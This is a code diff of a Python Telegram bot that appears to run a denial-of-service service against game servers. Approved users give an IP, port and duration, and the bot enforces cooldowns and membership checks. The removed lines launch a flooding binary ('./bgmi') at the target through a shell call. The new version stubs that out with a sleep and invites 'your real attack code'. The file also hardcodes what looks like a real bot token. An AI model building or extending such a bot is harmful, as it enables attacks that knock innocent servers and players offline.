@@ -6,7 +6,7 @@ from datetime import datetime, timedelta
 
 # Configuration
 TELEGRAM_BOT_TOKEN = "7140094105:AAEbc645NvvWgzZ5SJ3L8xgMv6hByfg2n_4"  # Replace with your Telegram Bot Token
-ADMIN_USER_ID = 1662672529
+ADMIN_USER_ID = 1662672529  # Replace with the admin's user ID
 APPROVED_IDS_FILE = 'approved_ids.txt'
 ATTACK_STATS_FILE = 'attack_stats.txt'
 CHANNEL_ID = "@fyyffgggvvvgvvcc"  # Replace with your channel username
@@ -67,16 +67,24 @@ async def is_member_of_channel(user_id: int, context: CallbackContext):
 def can_attack(user_id, attack_duration):
     """Check if a user can launch an attack based on cooldown."""
     global cooldown_data
+    attack_duration = int(attack_duration)  # Convert attack time to integer
+
+    # Check if the attack duration exceeds 300 seconds
+    if attack_duration > 300:
+        return False, "*⚠️ Maximum attack duration is 300 seconds.*"
+
     if user_id not in cooldown_data:
-        cooldown_data[user_id] = datetime.now()  # First time user
-        return True
+        cooldown_data[user_id] = datetime.now()  # First-time user
+        return True, None
 
     last_attack_time = cooldown_data[user_id]
-    cooldown_period = timedelta(seconds=int(attack_duration))  # Cooldown period based on attack duration
+    cooldown_period = timedelta(seconds=attack_duration)  # Cooldown is the same as attack duration
+
     if datetime.now() - last_attack_time >= cooldown_period:
         cooldown_data[user_id] = datetime.now()  # Reset cooldown
-        return True
-    return False
+        return True, None
+
+    return False, "*⚠️ Cooldown period has not passed yet.*"
 
 # Commands
 async def start(update: Update, context: CallbackContext):
@@ -199,9 +207,10 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Attack time must be a number!*", parse_mode='Markdown')
         return
 
-    # Handle cooldown logic based on attack time
-    if not can_attack(user_id, time):
-        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Cooldown period has not passed yet.*", parse_mode='Markdown')
+    # Check cooldown logic based on attack time
+    can_attack_now, error_message = can_attack(user_id, time)
+    if not can_attack_now:
+        await context.bot.send_message(chat_id=chat_id, text=error_message, parse_mode='Markdown')
         return
 
     # Check if attack limit is reached
@@ -231,41 +240,20 @@ async def attack(update: Update, context: CallbackContext):
     asyncio.create_task(run_attack(chat_id, ip, port, time, context, user_username))
 
 async def run_attack(chat_id, ip, port, time, context, user_username):
-    """Simulate an attack process."""
-    global attack_in_progress
-    attack_in_progress = True
+    """Simulate the attack with a delay based on the attack time."""
+    # Here you can simulate attack actions (or replace with your real attack code)
+    await asyncio.sleep(int(time))  # Wait for the specified attack duration
+    await context.bot.send_message(
+        chat_id=chat_id,
+        text=f"*💥 Attack on {ip}:{port} completed by @{user_username}.*",
+        parse_mode='Markdown'
+    )
 
-    try:
-        process = await asyncio.create_subprocess_shell(
-            f"./bgmi {ip} {port} {time} 500",
-            stdout=asyncio.subprocess.PIPE,
-            stderr=asyncio.subprocess.PIPE
-        )
-        stdout, stderr = await process.communicate()
-
-        if stdout:
-            print(f"[stdout]\n{stdout.decode()}")
-        if stderr:
-            print(f"[stderr]\n{stderr.decode()}")
-
-    except Exception as e:
-        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Error during the attack: {str(e)}*", parse_mode='Markdown')
-
-    finally:
-        attack_in_progress = False
-        await context.bot.send_message(
-            chat_id=chat_id, 
-            text=(
-                f"*💚 ATTACK FINISHED 💚*\n"
-                f"*🎉 The attack was completed by @{user_username}!*"
-            ), 
-            parse_mode='Markdown')
-
-# Main Function
 def main():
+    """Start the bot."""
     application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
 
-    # Command Handlers
+    # Add command handlers
     application.add_handler(CommandHandler("start", start))
     application.add_handler(CommandHandler("help", help_command))
     application.add_handler(CommandHandler("approve", approve))
@@ -275,5 +263,5 @@ def main():
 
     application.run_polling()
 
-if __name__ == '__main__':
+if __name__ == "__main__":
     main()
